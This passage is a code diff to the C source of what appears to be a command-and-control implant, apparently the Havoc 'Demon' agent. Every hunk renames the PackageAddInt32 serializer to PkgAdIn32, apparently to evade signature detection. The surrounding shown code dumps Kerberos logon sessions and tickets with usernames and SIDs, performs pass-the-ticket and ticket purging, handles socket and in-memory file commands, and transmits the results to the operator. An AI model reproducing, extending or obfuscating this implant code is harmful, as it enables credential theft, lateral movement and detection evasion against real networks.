+                PkgAdIn32( Package, Type );
+                PkgAdIn32( Package, FALSE );
+                PkgAdIn32( Package, Instance->Win32.WSAGetLastError() );
             }
         }
 
@@ -3011,18 +3011,18 @@ VOID CommandSocket( PPARSER Parser )
                     PRINTF( "Connect failed with %d\n", ErrorCode )
                 }
 
-                PackageAddInt32( Package, Socket ? TRUE : FALSE );
+                PkgAdIn32( Package, Socket ? TRUE : FALSE );
             }
             else
             {
                 PRINTF( "Could not resolve domain: %s\n", Domain );
                 // error code for "Host unreachable"
                 ErrorCode = WSAEHOSTUNREACH;
-                PackageAddInt32( Package, FALSE );
+                PkgAdIn32( Package, FALSE );
             }
 
-            PackageAddInt32( Package, ScId );
-            PackageAddInt32( Package, ErrorCode );
+            PkgAdIn32( Package, ScId );
+            PkgAdIn32( Package, ErrorCode );
 
             if ( IPv6 )
             {
@@ -3084,7 +3084,7 @@ VOID CommandKerberos(
     Package = PackageCreate( DEMON_COMMAND_KERBEROS );
     Command = ParserGetInt32( Parser );
 
-    PackageAddInt32( Package, Command );
+    PkgAdIn32( Package, Command );
     switch ( Command )
     {
         case KERBEROS_COMMAND_LUID: PUTS("Kerberos::LUID")
@@ -3099,12 +3099,12 @@ VOID CommandKerberos(
                 hToken = NULL;
             }
 
-            PackageAddInt32( Package, luid ? TRUE : FALSE );
+            PkgAdIn32( Package, luid ? TRUE : FALSE );
 
             if ( luid )
             {
-                PackageAddInt32( Package, luid->HighPart );
-                PackageAddInt32( Package, luid->LowPart );
+                PkgAdIn32( Package, luid->HighPart );
+                PkgAdIn32( Package, luid->LowPart );
 
                 MemSet( luid, 0, sizeof( LUID ) );
                 Instance->Win32.LocalFree( luid );
@@ -3134,11 +3134,11 @@ VOID CommandKerberos(
 
             Sessions = Klist( hToken, luid );
 
-            PackageAddInt32( Package, Sessions ? TRUE : FALSE );
+            PkgAdIn32( Package, Sessions ? TRUE : FALSE );
 
             for ( NumSessions = 0, SessionTmp = Sessions; SessionTmp; NumSessions++, SessionTmp = SessionTmp->Next ){}
 
-            PackageAddInt32( Package, NumSessions );
+            PkgAdIn32( Package, NumSessions );
 
             while ( Sessions )
             {
@@ -3146,13 +3146,13 @@ VOID CommandKerberos(
 
                 PackageAddWString( Package, Sessions->UserName );
                 PackageAddWString( Package, Sessions->Domain );
-                PackageAddInt32( Package, Sessions->LogonId.LowPart );
-                PackageAddInt32( Package, Sessions->LogonId.HighPart );
-                PackageAddInt32( Package, Sessions->Session );
+                PkgAdIn32( Package, Sessions->LogonId.LowPart );
+                PkgAdIn32( Package, Sessions->LogonId.HighPart );
+                PkgAdIn32( Package, Sessions->Session );
                 PackageAddWString( Package, Sessions->UserSID );
-                PackageAddInt32( Package, Sessions->LogonTime.LowPart );
-                PackageAddInt32( Package, Sessions->LogonTime.HighPart );
-                PackageAddInt32( Package, Sessions->LogonType );
+                PkgAdIn32( Package, Sessions->LogonTime.LowPart );
+                PkgAdIn32( Package, Sessions->LogonTime.HighPart );
+                PkgAdIn32( Package, Sessions->LogonType );
                 PackageAddWString( Package, Sessions->AuthenticationPackage );
                 PackageAddWString( Package, Sessions->LogonServer );
                 PackageAddWString( Package, Sessions->LogonServerDNSDomain );
@@ -3160,7 +3160,7 @@ VOID CommandKerberos(
 
                 for ( NumTickets = 0, TicketTmp = Sessions->Tickets; TicketTmp; NumTickets++, TicketTmp = TicketTmp->Next ){}
 
-                PackageAddInt32( Package, NumTickets );
+                PkgAdIn32( Package, NumTickets );
 
                 while ( Sessions->Tickets )
                 {
@@ -3170,14 +3170,14 @@ VOID CommandKerberos(
                     PackageAddWString( Package, Sessions->Tickets->ClientRealm );
                     PackageAddWString( Package, Sessions->Tickets->ServerName );
                     PackageAddWString( Package, Sessions->Tickets->ServerRealm );
-                    PackageAddInt32( Package, Sessions->Tickets->StartTime.LowPart );
-                    PackageAddInt32( Package, Sessions->Tickets->StartTime.HighPart );
-                    PackageAddInt32( Package, Sessions->Tickets->EndTime.LowPart );
-                    PackageAddInt32( Package, Sessions->Tickets->EndTime.HighPart );
-                    PackageAddInt32( Package, Sessions->Tickets->RenewTime.LowPart );
-                    PackageAddInt32( Package, Sessions->Tickets->RenewTime.HighPart );
-                    PackageAddInt32( Package, Sessions->Tickets->EncryptionType );
-                    PackageAddInt32( Package, Sessions->Tickets->TicketFlags );
+                    PkgAdIn32( Package, Sessions->Tickets->StartTime.LowPart );
+                    PkgAdIn32( Package, Sessions->Tickets->StartTime.HighPart );
+                    PkgAdIn32( Package, Sessions->Tickets->EndTime.LowPart );
+                    PkgAdIn32( Package, Sessions->Tickets->EndTime.HighPart );
+                    PkgAdIn32( Package, Sessions->Tickets->RenewTime.LowPart );
+                    PkgAdIn32( Package, Sessions->Tickets->RenewTime.HighPart );
+                    PkgAdIn32( Package, Sessions->Tickets->EncryptionType );
+                    PkgAdIn32( Package, Sessions->Tickets->TicketFlags );
                     PackageAddBytes( Package, Sessions->Tickets->Ticket.Buffer, Sessions->Tickets->Ticket.Length );
 
                     if ( Sessions->Tickets->Ticket.Buffer )
@@ -3208,7 +3208,7 @@ VOID CommandKerberos(
 
             luid.LowPart = ParserGetInt32( Parser );
 
-            PackageAddInt32( Package, Purge( hToken, luid ) ? TRUE : FALSE );
+            PkgAdIn32( Package, Purge( hToken, luid ) ? TRUE : FALSE );
 
             break;
         }
@@ -3223,7 +3223,7 @@ VOID CommandKerberos(
 
             luid.LowPart = ParserGetInt32( Parser );
 
-            PackageAddInt32( Package, Ptt( hToken, Ticket, TicketSize, luid ) ? TRUE : FALSE );
+            PkgAdIn32( Package, Ptt( hToken, Ticket, TicketSize, luid ) ? TRUE : FALSE );
 
             break;
         }
@@ -3254,8 +3254,8 @@ VOID CommandMemFile( PPARSER Parser )
 
     MemFile = ProcessMemFileChunk( ID, Size, Data.Buffer, Data.Length );
 
-    PackageAddInt32( Package, ID );
-    PackageAddInt32( Package, MemFile != NULL ? TRUE : FALSE );
+    PkgAdIn32( Package, ID );
+    PkgAdIn32( Package, MemFile != NULL ? TRUE : FALSE );
 
     PackageTransmit( Package );
 }
@@ -3343,7 +3343,7 @@ VOID CommandExit( PPARSER Parser )
         Package    = PackageCreate( DEMON_EXIT );
         ExitMethod = ParserGetInt32( Parser );
 
-        PackageAddInt32( Package, ExitMethod );
+        PkgAdIn32( Package, ExitMethod );
         PackageTransmit( Package );
         PackageTransmitAll( NULL, NULL );
     }
